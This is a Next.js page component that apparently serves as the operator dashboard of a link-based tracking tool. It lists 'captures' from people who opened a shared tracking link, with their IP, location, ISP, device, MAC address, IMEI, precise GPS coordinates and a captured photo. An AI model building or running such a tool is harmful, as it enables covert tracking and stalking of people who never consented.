'use client';

import { useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { supabase } from '@/lib/supabase';

interface CapturedData {
  id: string;
  ip_address: string;
  country: string;
  city: string;
  region: string;
  isp: string;
  timezone: string;
  latitude: number;
  longitude: number;
  device_type: string;
  device_brand: string;
  device_model: string;
  os: string;
  os_version: string;
  browser: string;
  browser_version: string;
  user_agent: string;
  language: string;
  screen_resolution: string;
  mac_address: string;
  imei: string;
  gps_latitude: number;
  gps_longitude: number;
  gps_accuracy: number;
  photo_url: string;
  captured_at: string;
}

interface TrackingLink {
  id: string;
  title: string;
  tracking_type: string;
  target_url: string;
  tracking_code: string;
}

export default function ResultsPage() {
  const params = useParams();
  const [link, setLink] = useState<TrackingLink | null>(null);
  const [captures, setCaptures] = useState<CapturedData[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedCapture, setSelectedCapture] = useState<CapturedData | null>(null);

  useEffect(() => {
    loadData();
  }, [params.id]);

  const loadData = async () => {
    const { data: linkData } = await supabase
      .from('tracking_links')
      .select('*')
      .eq('id', params.id)
      .single();

    if (linkData) setLink(linkData);

    const { data: capturesData } = await supabase
      .from('captured_data')
      .select('*')
      .eq('tracking_link_id', params.id)
      .order('captured_at', { ascending: false });

    if (capturesData) {
      setCaptures(capturesData);
      if (capturesData.length > 0) setSelectedCapture(capturesData[0]);
    }

    setLoading(false);
  };

  if (loading) return <div style={{ textAlign: 'center', padding: '50px', color: '#999' }}>Loading...</div>;
  if (!link) return <div style={{ textAlign: 'center', padding: '50px', color: '#999' }}>Link not found</div>;

  return (
    <div style={styles.container}>
      <div style={styles.header}>
        <div>
          <h1 style={styles.title}>{link.title}</h1>
          <p style={styles.subtitle}>
            Code: <code style={styles.code}>{link.tracking_code}</code> |{' '}
            Type: {link.tracking_type} | Target: {link.target_url} | Captures: {captures.length}
          </p>
        </div>
      </div>

      {captures.length === 0 ? (
        <div style={styles.emptyState}>
          <span style={{ fontSize: '48px' }}>📭</span>
          <h3>No data captured yet</h3>
          <p>Share your tracking link to start collecting data.</p>
        </div>
      ) : (
        <div style={styles.layout}>
          <div style={styles.sidebar}>
            <h3 style={styles.sidebarTitle}>Captures</h3>
            {captures.map((c, i) => (
              <div
                key={c.id}
                style={{
                  ...styles.captureItem,
                  background: selectedCapture?.id === c.id ? '#667eea' : '#f8f9fa',
                  color: selectedCapture?.id === c.id ? 'white' : '#333',
                }}
                onClick={() => setSelectedCapture(c)}
              >
                <span style={styles.captureItemNum}>#{i + 1}</span>
                <div>
                  <p style={styles.captureItemIp}>{c.ip_address || 'N/A'}</p>
                  <p
                    style={{
                      ...styles.captureItemTime,
                      color: selectedCapture?.id === c.id ? 'rgba(255,255,255,0.7)' : '#999',
                    }}
                  >
                    {new Date(c.captured_at).toLocaleString()}
                  </p>
                </div>
              </div>
            ))}
          </div>

          <div style={styles.mainContent}>
            {selectedCapture && (
              <div>
                <div style={styles.section}>
                  <h4 style={styles.sectionTitle}>🌐 IP & Location</h4>
                  <div style={styles.grid}>
                    <div style={styles.field}>
                      <label>IP</label>
                      <span><code>{selectedCapture.ip_address || 'N/A'}</code></span>
                    </div>
                    <div style={styles.field}><label>Country</label><span>{selectedCapture.country || 'N/A'}</span></div>
                    <div style={styles.field}><label>City</label><span>{selectedCapture.city || 'N/A'}</span></div>
                    <div style={styles.field}><label>Region</label><span>{selectedCapture.region || 'N/A'}</span></div>
                    <div style={styles.field}><label>ISP</label><span>{selectedCapture.isp || 'N/A'}</span></div>
                    <div style={styles.field}><label>Timezone</label><span>{selectedCapture.timezone || 'N/A'}</span></div>
                    <div style={styles.field}>
                      <label>Coordinates</label>
                      <span>{selectedCapture.latitude && selectedCapture.longitude ? `${selectedCapture.latitude}, ${selectedCapture.longitude}` : 'N/A'}</span>
                    </div>
                  </div>
                </div>

                <div style={styles.section}>
                  <h4 style={styles.sectionTitle}>📱 Device Info</h4>
                  <div style={styles.grid}>
                    <div style={styles.field}><label>Type</label><span>{selectedCapture.device_type || 'N/A'}</span></div>
                    <div style={styles.field}><label>Brand</label><span>{selectedCapture.device_brand || 'N/A'}</span></div>
                    <div style={styles.field}><label>Model</label><span>{selectedCapture.device_model || 'N/A'}</span></div>
                    <div style={styles.field}><label>OS</label><span>{selectedCapture.os} {selectedCapture.os_version || ''}</span></div>
                    <div style={styles.field}><label>Browser</label><span>{selectedCapture.browser} {selectedCapture.browser_version || ''}</span></div>
                    <div style={styles.field}><label>Language</label><span>{selectedCapture.language || 'N/A'}</span></div>
                    <div style={styles.field}><label>Screen</label><span>{selectedCapture.screen_resolution || 'N/A'}</span></div>
                  </div>
                </div>

                <div style={styles.section}>
                  <h4 style={styles.sectionTitle}>🔑 Hardware IDs</h4>
                  <div style={styles.grid}>
                    <div style={styles.field}><label>MAC</label><span><code>{selectedCapture.mac_address || 'N/A'}</code></span></div>
                    <div style={styles.field}><label>IMEI</label><span><code>{selectedCapture.imei || 'N/A'}</code></span></div>
                  </div>
                  <div style={{ marginTop: '10px' }}>
                    <label style={{ fontSize: '12px', color: '#999', display: 'block', marginBottom: '4px' }}>User Agent</label>
                    <span style={{ fontSize: '11px', wordBreak: 'break-all', color: '#666' }}>{selectedCapture.user_agent || 'N/A'}</span>
                  </div>
                </div>

                {selectedCapture.gps_latitude && (
                  <div style={styles.section}>
                    <h4 style={styles.sectionTitle}>🛰️ GPS Data</h4>
                    <div style={styles.grid}>
                      <div style={styles.field}><label>Lat</label><span>{selectedCapture.gps_latitude}</span></div>
                      <div style={styles.field}><label>Lng</label><span>{selectedCapture.gps_longitude}</span></div>
                      <div style={styles.field}><label>Accuracy</label><span>{selectedCapture.gps_accuracy ? `${selectedCapture.gps_accuracy}m` : 'N/A'}</span></div>
                    </div>
                    <a href={`https://www.google.com/maps?q=${selectedCapture.gps_latitude},${selectedCapture.gps_longitude}`} target="_blank" rel="noreferrer" style={styles.mapLink}>View on Maps ↗</a>
                  </div>
                )}

                {selectedCapture.photo_url && (
                  <div style={styles.section}>
                    <h4 style={styles.sectionTitle}>📸 Photo</h4>
                    <img src={selectedCapture.photo_url} alt="Captured" style={styles.photo} />
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}

const styles: Record<string, React.CSSProperties> = {
  container: { maxWidth: '1200px', margin: '0 auto' },
  header: { marginBottom: '30px' },
  title: { fontSize: '24px', fontWeight: 700, color: '#1a1a2e' },
  subtitle: { color: '#666', fontSize: '13px', marginTop: '8px' },
  code: { background: '#f0f2f5', padding: '3px 8px', borderRadius: '4px', fontSize: '12px', fontFamily: 'monospace' },
  emptyState: { textAlign: 'center', padding: '60px', background: 'white', borderRadius: '15px', color: '#999' },
  layout: { display: 'flex', gap: '20px' },
  sidebar: { width: '280px', flexShrink: 0 },
  sidebarTitle: { fontSize: '16px', fontWeight: 600, marginBottom: '12px', color: '#1a1a2e' },
  captureItem: { display: 'flex', alignItems: 'center', gap: '12px', padding: '12px', borderRadius: '10px', cursor: 'pointer', marginBottom: '8px' },
  captureItemNum: { fontWeight: 700, fontSize: '13px' },
  captureItemIp: { fontWeight: 600, fontSize: '13px' },
  captureItemTime: { fontSize: '11px', marginTop: '2px' },
  mainContent: { flex: 1 },
  section: { background: 'white', borderRadius: '12px', padding: '20px', marginBottom: '16px', boxShadow: '0 2px 8px rgba(0,0,0,0.04)' },
  sectionTitle: { fontSize: '15px', fontWeight: 600, color: '#1a1a2e', marginBottom: '16px' },
  grid: { display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '12px' },
  field: { display: 'flex', flexDirection: 'column', gap: '2px' },
  mapLink: { display: 'inline-block', marginTop: '12px', color: '#667eea', fontWeight: 600, fontSize: '13px' },
  photo: { width: '100%', maxWidth: '400px', borderRadius: '10px', marginTop: '10px' },
};
